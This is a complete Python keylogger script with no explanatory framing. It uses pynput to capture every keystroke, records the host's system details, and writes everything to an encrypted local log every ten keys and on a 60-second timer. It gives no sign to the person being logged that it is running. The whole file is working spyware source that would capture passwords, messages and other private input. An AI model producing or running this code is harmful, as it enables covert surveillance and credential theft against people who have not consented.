from pynput import keyboard
from datetime import datetime
import os
import platform
import threading
from cryptography.fernet import Fernet

keys = []
key_count = 0
log_file_path = "log.txt"

# Generate a key for encryption
def generate_key():
    return Fernet.generate_key()

# Load or create encryption key
def load_key():
    if not os.path.exists("key.key"):
        key = generate_key()
        with open("key.key", "wb") as key_file:
            key_file.write(key)
    else:
        with open("key.key", "rb") as key_file:
            key = key_file.read()
    return key

encryption_key = load_key()
cipher = Fernet(encryption_key)

# Handle each key press
def on_press(key):
    global keys, key_count
    try:
        keys.append(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            keys.append(" ")
        elif key == keyboard.Key.enter:
            keys.append("\n")
        else:
            keys.append(f"[{key.name}]")
    key_count += 1
    
    if key_count >= 10:  # Log every 10 key presses
        write_file()
        key_count = 0

# Save the logged keys to a file and clear the list
def write_file():
    if not keys:
        return
    log_data = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] " + "".join(keys)
    encrypted_data = cipher.encrypt(log_data.encode())
    with open(log_file_path, "ab") as file:
        file.write(encrypted_data + b"\n")
    keys.clear()

# Report system info to log file at start
def log_system_info():
    system_info = f"System: {platform.system()} {platform.release()}\n"
    system_info += f"Node Name: {platform.node()}\n"
    system_info += f"Platform: {platform.platform()}\n"
    system_info += f"Processor: {platform.processor()}\n"
    encrypted_data = cipher.encrypt(system_info.encode())
    with open(log_file_path, "ab") as file:
        file.write(encrypted_data + b"\n")

# Background thread to periodically write to file (if needed)
def periodic_write(interval=60):
    threading.Timer(interval, periodic_write).start()
    write_file()

# Start listening to keyboard events
log_system_info()
periodic_write()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
